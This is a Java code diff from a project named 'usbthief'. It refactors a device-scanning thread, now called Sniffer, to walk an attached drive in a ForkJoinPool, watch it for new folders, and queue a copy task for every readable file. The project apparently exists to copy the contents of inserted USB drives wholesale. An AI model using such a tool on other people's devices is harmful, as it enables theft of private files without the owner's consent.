@@ -1,40 +1,45 @@
 package com.superredrock.usbthief.worker;
 
+import com.superredrock.usbthief.core.Device;
 import com.superredrock.usbthief.core.config.ConfigManager;
 import com.superredrock.usbthief.core.config.ConfigSchema;
 import com.superredrock.usbthief.core.QueueManager;
 import com.superredrock.usbthief.core.event.EventBus;
 import com.superredrock.usbthief.core.event.worker.FileDiscoveredEvent;
 
+import java.io.Closeable;
 import java.io.IOException;
 import java.nio.file.*;
 import java.nio.file.attribute.BasicFileAttributes;
-import java.time.Instant;
 import java.util.Map;
-import java.util.concurrent.ConcurrentHashMap;
-import java.util.concurrent.TimeUnit;
+import java.util.concurrent.*;
 import java.util.concurrent.atomic.AtomicInteger;
 import java.util.function.BiPredicate;
+import java.util.logging.Level;
 import java.util.logging.Logger;
 import java.util.stream.Collectors;
 import java.util.stream.Stream;
 
-public class DeviceScanner extends Thread {
-    protected static final Logger logger = Logger.getLogger(DeviceScanner.class.getName());
+public class Sniffer extends Thread implements Closeable {
+    protected static final Logger logger = Logger.getLogger(Sniffer.class.getName());
 
-    private final FileStore rootStore;
     private final Path root;
     private final WatchService monitor;
-    private final com.superredrock.usbthief.core.Device device;
+    private final Device device;
 
     private final AtomicInteger changeCount = new AtomicInteger(0);
     private final ConcurrentHashMap<Path, WatchKey> watchKeys = new ConcurrentHashMap<>();
     private volatile boolean running = true;
+    
+    /**
+     * Dedicated ForkJoinPool for parallel file scanning.
+     * Allows interrupt via shutdownNow() during initial scan.
+     */
+    private static final ForkJoinPool scanPool = new ForkJoinPool();
 
-    public DeviceScanner(com.superredrock.usbthief.core.Device device, FileStore rootStore) {
+    public Sniffer(Device device, FileStore rootStore) {
         super(QueueManager.getDiskScanners(), "DiskScanner: " + rootStore.name());
         this.device = device;
-        this.rootStore = rootStore;
         this.root = device.getRootPath();
         WatchService ws;
         try {
@@ -48,10 +53,13 @@ public class DeviceScanner extends Thread {
 
     @Override
     public void run() {
-        try {
-            performInitialScan();
-        } catch (IOException e) {
+        try {performInitialScan();}
+        catch (IOException e) {
             logger.severe("Error while scanning disk: " + e.getMessage());
+            return;
+        }
+
+        if (Thread.currentThread().isInterrupted()) {
             return;
         }
 
@@ -71,28 +79,41 @@ public class DeviceScanner extends Thread {
 
     private void performInitialScan() throws IOException {
         logger.info("Scanning Disk " + root);
+        BiPredicate<Path, BasicFileAttributes> filter = createFileFilter();
 
-        long maxSize = ConfigManager.getInstance().get(ConfigSchema.MAX_FILE_SIZE);
-        BiPredicate<Path, BasicFileAttributes> filter = createFileFilter(maxSize);
-
-        try (Stream<Path> paths = Files.find(root, Integer.MAX_VALUE, filter).parallel()) {
-            paths
-                    .peek(path -> EventBus.getInstance().dispatch(new FileDiscoveredEvent(path, 0, device.getSerialNumber()))
-                    ).filter(Files::exists)
-                    .forEach(this::submitCopyTask);
+        ForkJoinTask<?> scan = scanPool.submit(
+                () -> {
+                    try (Stream<Path> paths = Files.find(root, Integer.MAX_VALUE, filter).parallel()) {
+                        paths.peek(path -> EventBus.getInstance().dispatch(new FileDiscoveredEvent(path, 0, device.getSerialNumber())))
+                                .forEach(path -> {
+                            if (Thread.currentThread().isInterrupted()) {
+                                throw new RuntimeException("Scan interrupted");
+                            }
+                            submitCopyTask(path);
+                        });
+                    } catch (IOException e) {
+                        logger.log(Level.WARNING,"Fail",e);
+                    }
+                }
+                );
+        try {
+            scan.get();
+        } catch (InterruptedException | ExecutionException e) {
+            this.interrupt();
+            scan.cancel(true);
         }
 
         logger.info("Initial scan completed for " + root);
     }
 
-    private BiPredicate<Path, BasicFileAttributes> createFileFilter(long maxSize) {
+    private BiPredicate<Path, BasicFileAttributes> createFileFilter() {
+        long maxSize = ConfigManager.getInstance().get(ConfigSchema.MAX_FILE_SIZE);
         return (path, attrs) -> {
             try {
                 if (Files.isHidden(path)) return false;
             } catch (IOException e) {
                 return false;
             }
-
             if (!Files.isReadable(path)) return false;
 
             return !attrs.isRegularFile() || attrs.size() > 0 && attrs.size() <= maxSize;
@@ -101,10 +122,6 @@ public class DeviceScanner extends Thread {
 
     private void processDirectorySafely(Path dir) {
         try {
-            if (Files.isHidden(dir)) {
-                logger.fine("Skip hidden directory: " + dir);
-                return;
-            }
             submitCopyTask(dir);
             registerDirectoryWatch(dir);
             logger.fine("Registered directory: " + dir);
@@ -115,29 +132,41 @@ public class DeviceScanner extends Thread {
 
 
     private void submitCopyTask(Path path) {
-        CopyTask rawTask = new CopyTask(path, device.getSerialNumber());
-        int priority = TaskScheduler.getInstance().getPriorityRule().calculatePriority(path);
-        PriorityCopyTask priorityTask = new PriorityCopyTask(rawTask, priority, device, Instant.now());
-        TaskScheduler.getInstance().submit(priorityTask);
+        CopyTask task = new CopyTask(path, device.getSerialNumber());
+        TaskScheduler.getInstance().submit(task);
     }
 
     private void scanNewDirectory(Path dir) throws IOException {
         registerDirectoryWatch(dir);
 
-        long maxSize = ConfigManager.getInstance().get(ConfigSchema.MAX_FILE_SIZE);
-        BiPredicate<Path, BasicFileAttributes> filter = createFileFilter(maxSize);
+        BiPredicate<Path, BasicFileAttributes> filter = createFileFilter();
 
-        try (Stream<Path> paths = Files.find(dir, Integer.MAX_VALUE, filter).parallel()) {
-            Map<Boolean, java.util.List<Path>> partitioned = paths.collect(
-                Collectors.partitioningBy(Files::isDirectory)
-            );
+        try {
+            scanPool.submit(() -> {
+                try (Stream<Path> paths = Files.find(dir, Integer.MAX_VALUE, filter).parallel()) {
+                    Map<Boolean, java.util.List<Path>> partitioned = paths.collect(
+                        Collectors.partitioningBy(Files::isDirectory)
+                    );
 
-            partitioned.getOrDefault(true, java.util.List.of())
-                .forEach(this::processDirectorySafely);
+                    partitioned.getOrDefault(true, java.util.List.of())
+                        .forEach(this::processDirectorySafely);
 
-            partitioned.getOrDefault(false, java.util.List.of())
-                .parallelStream()
-                .forEach(this::submitCopyTask);
+                    partitioned.getOrDefault(false, java.util.List.of())
+                        .parallelStream()
+                        .forEach(this::submitCopyTask);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }).join();
+        } catch (RuntimeException e) {
+            if (e.getCause() instanceof InterruptedException) {
+                logger.info("Directory scan interrupted: " + dir);
+                Thread.currentThread().interrupt();
+            } else if (e.getCause() instanceof IOException ioException) {
+                throw ioException;
+            } else {
+                throw e;
+            }
         }
     }
 
@@ -248,10 +277,6 @@ public class DeviceScanner extends Thread {
         logger.fine("Registered watch for directory: " + dir);
     }
 
-    public FileStore getRootStore() {
-        return rootStore;
-    }
-
     public void stopMonitoring() {
         running = false;
         if (monitor != null) {
@@ -276,5 +301,11 @@ public class DeviceScanner extends Thread {
                 logger.warning("Error closing WatchService: " + e.getMessage());
             }
         }
+    }
+
+    @Override
+    public void close() throws IOException {
+        stopMonitoring();
+        this.interrupt();
     }
 }
